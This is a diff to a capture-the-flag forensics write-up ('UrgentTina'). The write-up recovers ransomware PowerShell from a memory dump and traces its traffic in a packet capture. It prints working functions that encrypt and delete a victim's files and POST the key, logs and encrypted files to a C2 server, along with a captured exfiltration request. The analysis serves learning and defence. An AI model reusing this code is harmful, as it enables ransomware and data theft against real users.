@@ -18,9 +18,9 @@ _Files given_
 
 #### `.pcapng` file inspection
 
-Opening the `.pcap` file.
+Opening the `.pcapng` file.
 
-![Opened .pcap file](../assets/img/UrgentTina/2025-04-05_00-25.png)
+![Opened .pcapng file](../assets/img/UrgentTina/2025-04-05_00-25.png)
 _Opened file_
 
 Let's follow the TCP stream to check what was going on.
@@ -28,7 +28,7 @@ Let's follow the TCP stream to check what was going on.
 ![TCP stream](../assets/img/UrgentTina/2025-04-05_00-28.png)
 _TCP stream_
 
-It seems to be encoded. We were given not only the `.pcap` file but also a `.DMP` - a memory dump - maybe the encoding algorithm was in the memory dump. So let's leave the `.pcap` there for now and inspect the memory dump.
+It seems to be encoded. We were given not only the `.pcapng` file but also a `.DMP` - a memory dump - maybe the encoding algorithm was in the memory dump. So let's leave the `.pcapng` there for now and inspect the memory dump.
 #### memdump inspection
 A memory dump suggests we use `Volatility`, so let's try it out.
 
@@ -61,6 +61,7 @@ Hmm, the memory dump seems to be corrupted. Let's see if there's any workaround.
 Let's try something like `strings` and output to a file to see the memory dump content.
 
 ![Memory dump content](../assets/img/UrgentTina/2025-04-05_01-58.png)
+_Strings Content_
 
 This is fascinating. A program called `update.exe` was executed in the user's `Desktop`.
 
@@ -81,7 +82,7 @@ And PowerShell module was called -> This suggests the executed program could hav
 So now we must find the PowerShell script executed within the memory dump.
 
 ![alt text](../assets/img/UrgentTina/2025-04-05_02-16.png)
-
+_Strings Content (Powershell code block)_
 A PowerShell sciprt block was found right below the place we found where the program was executed. The script is pretty long.
 
 ```powershell
@@ -315,7 +316,6 @@ else {
    if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
    else { SendOK }
 sleep 1000 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
-BSJB
 ```
 ### PowerShell code block analysis
 - Section:
@@ -339,7 +339,8 @@ BSJB
      - `CreateReadme`: Creates `yaginote.txt` with: Ransom message and Bank Account.
      - `EncryptFiles`: Encrypts all files in a directory and deletes the original.
      - `ExfiltrateFiles`: Uploads encrypted file to the C2 server.
-     - `CheckFiles`: Check if any `.enc` files exist in `$Directory` 
+     - `CheckFiles`: Check if any `.enc` files exist in `$Directory`
+     - `Main`: Execute the main flow. 
   
 > From the code we could see the program flow will be:
 > 1. Check the OS, the `args` and setup proxy for the C2
@@ -440,5 +441,144 @@ function Invoke-AESEncryption {
    - It creates an AES Encryptor with the key and a random IV
    - Encrypts the plaintext bytes and stores them in `$encryptedBytes`
    - The IV is added to the encrypted data
+   - Return `base64` encoded text or file
    - Clean up AES resources
-   
+#### R64Encoder
+```powershell
+function R64Encoder { 
+   if ($args[0] -eq "-t") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
+   if ($args[0] -eq "-f") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
+   $VaFQ = $VaFQ.Split("=")[0] ; $VaFQ = $VaFQ.Replace("C", "-") ; $VaFQ = $VaFQ.Replace("E", "_")
+   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }
+```
+- Takes `$args` as input
+  - If `$args[0]` is "-t", converts the text in `$args[1]` to bytes using UTF-8, then encodes it using base64 and stores it in `$VaFQ`
+  - If `$args[0]` is "-f", reads the file in `$args[1]`, converts it to bytes, then encodes it using base64 and stores it in `$VaFQ`
+  - Removes the padding character "=" from base64 and replaces "C" with "-" as well as "E" with "_"
+  - Converts `$VaFQ` to a character array stored in `$8bKW`, reverses the array, then joins all characters to create and return `$R64Base`
+#### SendResults
+```powershell
+function SendResults {
+   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
+   $2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
+   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
+   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
+   Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
+   Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
+```
+- Use `AES` on `$WiETm` with the key stored in `$Uz19o` thenstored it in `$cvf`
+- `$cvf` then get encoded by `R64Encoder` and stored in `$cVl` 
+- Stored `$cVl`, `$OgE`, `$zVSza` and `$7VEq` in `$2YngY` respectively. 
+-  Filter all strings, line that have `!` in `$Directory$slash$I26`, excluding all strings have `YagiRansom!` and logs it to `$RansomLogs`
+-  Encode `$2YngY` with base64 and stores it in `$XoX`
+-  `$RansomLogs` also got encrypted with base64 and stored in `$B64Logs`
+-  Send the `$XoX` to endpoint `$7CiB:$UFX/data` and `$B64Logs` to endpoint `$7CiB:$UFX/logs`
+#### EncryptFiles
+```powershell
+function EncryptFiles { 
+   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
+   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
+   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path "$Directory$slash$I26" -Value "[!] $i is now encrypted" ;
+   Remove-Item $i }
+   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch ; if (!$RansomLogs) { 
+   Add-Content -Path "$Directory$slash$I26" -Value "[!] No files have been encrypted!" }}
+```
+- Create a exclusion list for the ecnryption function. 
+- Browse through the folder and exclude all the files that have extension in the list, put the path in `$i`
+- Use AES on `$i` with the key is `$WiETm` and logs them in the format:  `$Directory$slash$I26" -Value "[!] $i is now encrypted`  
+- Only log the file has `!` and excluding the `YagiRansom!`
+#### ExfiltrateFiles
+```powershell
+function ExfiltrateFiles {
+   Invoke-WebRequest -useb "$7CiB`:$UFX/files" -Method GET 2>&1> $null 
+   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
+      Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
+```
+- Sends an initial request to the C2 server at `$7CiB:$UFX/files` endpoint.
+- Checks if any files have been encrypted by searching for the text "No files have been encrypted!" in the ransom note.
+- If files have been encrypted:
+  - Finds all `.enc` files in the directory and its subdirectories.
+  - For each encrypted file:
+    - Extracts the filename using `split` with the system's path separator.
+    - Encodes the file content using `R64Encoder` with `-f` flag.
+    - Encodes the filename using `R64Encoder` with `-t` flag.
+    - Uploads the encoded file to the C2 server using the encoded filename in the URL path
+#### Main
+```powershell
+if ($Mode -eq "-d") { 
+   Write-Host ; Write-Host "[!] Shutdowning...." -ForegroundColor Red; sleep 1 }
+else {
+   Write-Host ;
+   Write-Host "[+] Checking communication with C2 Server.." -ForegroundColor Blue
+   $DCe = GetStatus ; sleep 1
+   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
+   Write-Host "[!] Encrypting ..." -ForegroundColor Red
+   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1
+   if ($ENyR -eq "-x") { Write-Host "[i] Exfiltrating ..." -ForegroundColor Green
+      ExfiltrateFiles ; sleep 1 }}
+   if (!$DCe) { Write-Host "[+] Saving logs in yaginote.txt.." -ForegroundColor Blue }
+   else { Write-Host "[+] Sending logs to C2 Server.." -ForegroundColor Blue }}
+   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
+   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
+   else { SendOK }
+sleep 1000 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
+```
+- Create `$WiETm` randomly.
+- Encrypt files in `EncrypFiles`.
+- Use `ExfiltrateFiles` to filter and send the data.
+### Reversing the encryption process
+We need to find the main key `$WiETm`. You can use `Ctrl` + `F` to find where `WiETm` is used in the functions.
+
+We can see in the function `SendResults`:
+```powershell
+function SendResults {
+   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
+   $2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
+   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
+   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
+   Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
+   Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
+```
+- `$WiETm` is the plaintext that gets encrypted with AES using the key `$Uz19o` and stored in `$cvf`
+- `$cvf` is then encoded by `R64Encoder` and stored in `$cVl`
+- `$cVl` is stored in `$2YngY` along with other variables
+- `$2YngY` is encoded with base64 and stored in `$XoX`
+- `$XoX` is then sent to the server
+
+That was tiresome ~~. We got the `.pcapng` file tho, this could help us to get the data we need.
+#### $XoX
+
+Luckily the data was right at the beginning.
+
+![alt text](../assets/img/UrgentTina/2025-04-07_21-03.png)
+_TCP Stream_
+
+```http
+POST /data HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237
+Content-Type: application/x-www-form-urlencoded
+Host: 192.168.240.1:443
+Content-Length: 188
+
+0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP
+HTTP/1.1 200 OK
+Content-Length: 69
+Server: Microsoft-HTTPAPI/2.0
+Date: Wed, 18 Sep 2024 17:09:37 GMT
+
+<h1>It Works!</h1><p>This is the default web page for this server</p>
+```
+The endpoint was `/data` and sent with `HTTP POST`. Thus we could see our first clue.
+
+```
+$XoX = 0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP
+```
+
+#### $2YngY
+We got `$XoX` and `$2YngY` was encrypted with bas64 to `$XoX`.
+
+We could write a script to decode `$XoX` to get the data we need.
+
